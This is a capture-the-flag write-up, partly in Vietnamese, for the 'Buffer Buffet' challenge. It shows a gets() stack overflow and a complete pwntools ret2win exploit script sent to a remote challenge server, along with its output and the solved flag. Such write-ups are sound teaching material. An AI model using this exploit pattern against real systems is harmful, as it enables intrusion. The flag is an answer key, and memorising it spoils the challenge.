# Buffer Buffet
## Analysis
Lỗi Buffer overflow trong hàm vuln  
Hàm secretFunction in ra flag
```
undefined8 vuln(void) {
  char local_198 [400];
  
  puts("Enter some text:");
  gets(local_198);
  printf("You entered: %s\n",local_198);
  return 0;
}
```
```
void secretFunction(void) {
  puts("Congratulations!");
  puts("Flag: OSCTF{run_this_same_script_on_server}");
  return;
}
```
## Solution
Sử dụng kỹ thuật ret2win:
```
#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./vuln", checksec = False)
con = remote("34.125.199.248", 4056)

payload = b"a"*408 + p64(elf.sym['secretFunction'])
con.sendlineafter(b"text", payload)

con.interactive()
```
```
└─$ ./exp.py
[+] Opening connection to 34.125.199.248 on port 4056: Done
[*] Switching to interactive mode
:
You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd6@
Congratulations!
Flag: OSCTF{buff3r_buff3t_w4s_e4sy!}
```
## Flag
```
OSCTF{buff3r_buff3t_w4s_e4sy!}
```